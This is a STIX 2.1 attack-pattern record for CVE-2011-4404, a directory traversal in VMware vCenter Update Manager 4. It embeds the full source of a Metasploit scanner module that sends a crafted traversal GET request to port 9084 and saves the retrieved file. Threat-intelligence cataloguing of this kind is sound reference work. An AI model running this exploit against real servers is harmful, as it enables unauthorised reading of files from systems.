{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c75a3722-1e02-4d91-b49e-a7f9315bb923",
    "created": "2024-08-14T16:27:38.943271Z",
    "modified": "2024-08-14T16:27:38.943277Z",
    "name": "\"VMWare Update Manager 4 Directory Traversal\"",
    "description": " This modules exploits a directory traversal vulnerability in VMWare Update Manager on port 9084.  Versions affected by this vulnerability: vCenter Update Manager 4.1 prior to Update 2, vCenter Update Manager 4 Update 4.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vmware/vmware_update_manager_traversal.rb",
            "external_id": "vmware_update_manager_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4404"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2011-0014.html"
        },
        {
            "source_name": "reference",
            "url": "http://dsecrg.com/pages/vul/show.php?id=342"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"VMWare Update Manager 4 Directory Traversal\",\n      'Description'    => %q{\n        This modules exploits a directory traversal vulnerability in VMWare Update Manager\n        on port 9084.  Versions affected by this vulnerability: vCenter Update Manager\n        4.1 prior to Update 2, vCenter Update Manager 4 Update 4.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Alexey Sintsov',  #Initial discovery, poc\n          'sinn3r'           #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4404'],\n          ['EDB', '18138'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2011-0014.html'],\n          ['URL', 'http://dsecrg.com/pages/vul/show.php?id=342']\n        ],\n      'DisclosureDate' => '2011-11-21'))\n\n    register_options(\n      [\n        Opt::RPORT(9084),\n        OptString.new('URIPATH', [true, 'URI path to the downloads', '/vci/downloads/']),\n        OptString.new('FILE', [true, 'Define the remote file to download', 'windows\\\\win.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    fname     = File.basename(datastore['FILE'])\n    traversal = \".\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\"\n    uri = normalize_uri(datastore['URIPATH']) + traversal + datastore['FILE']\n\n    print_status(\"#{rhost}:#{rport} - Requesting: #{uri}\")\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => uri\n    }, 25)\n\n    # If there's no response, don't bother\n    if res.nil? or res.body.empty?\n      print_error(\"No content retrieved from: #{ip}\")\n      return\n    end\n\n    if res.code == 404\n      print_error(\"#{rhost}:#{rport} - File not found\")\n      return\n    else\n      print_good(\"File retrieved from: #{ip}\")\n      p = store_loot(\"vmware.traversal.file\", \"application/octet-stream\", rhost, res.to_s, fname)\n      print_good(\"File stored in: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-21"
}